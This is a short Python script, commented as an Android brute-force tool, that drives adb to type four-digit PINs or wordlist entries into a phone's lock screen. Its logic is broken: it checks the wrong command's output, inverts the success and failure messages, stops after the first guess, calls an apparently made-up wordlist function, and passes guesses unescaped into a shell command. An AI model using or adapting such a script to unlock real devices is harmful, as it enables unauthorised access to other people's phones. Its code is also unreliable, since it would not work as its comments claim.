import itertools
import pydictor
import subprocess

def abf():# Andoride Brute Force
    
	# Get the list of possible passwords
	digits = "0123456789"
	passwords = [''.join(i) for i in itertools.product(digits, repeat=4)]
	
	# Get the list of words from the pydictor library
	words = pydictor.get_words("results/output.txt")

	# Try each password
	for password in words:# passwords
		
		# Check if password entry screen is open	
		result = subprocess.run(["adb", "shell", "dumpsys", "window", "windows"],capture_output=True)
		if b"com.android.systemui/.keyguard.KeyguardViewMediator\n" not in result.stdout:
			print("Password entry screen not open.")
		
		# Attempt to unlock the device using the password
		command = f"adb shell input text {password} && adb shell input keyevent 66"
		result2 = subprocess.run(command, shell=True, capture_output=True)
		
		# check if loced succed and break or not
		if b'locked Succed' in result.stdout:
			print("Fail! Password is:", password)
			break # we will be break loop 
		else:
			print("Success!  Password is:", password)
			break # we will be break loop 

  
  
